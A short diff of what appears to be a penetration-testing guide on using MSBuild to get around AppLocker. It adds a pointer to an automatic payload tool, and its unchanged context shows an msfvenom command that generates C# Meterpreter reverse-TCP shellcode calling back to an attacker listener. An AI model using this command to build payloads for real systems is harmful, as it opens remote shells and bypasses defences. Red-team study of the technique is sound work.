@@ -70,6 +70,10 @@ Originally MSBuild was introduced in order to enable developers to build product
 
 It is possible to use Metasploit MSFVenom in order to generate C\# shellcode which it will be executed on the target system in order to obtain a Meterpreter session. 
 
+**Use** [**unlock applocker** ](../tools/unlock-applocker.md)**to generate payload automatic** 
+
+#### Manually:
+
 Generate payload: 
 
 `msfvenom --platform windows -p windows/meterpreter/reverse_tcp lhost=10.10.10.1 lport=445 -f csharp -o meterpreter_445.cs -v shellcode`                                                         
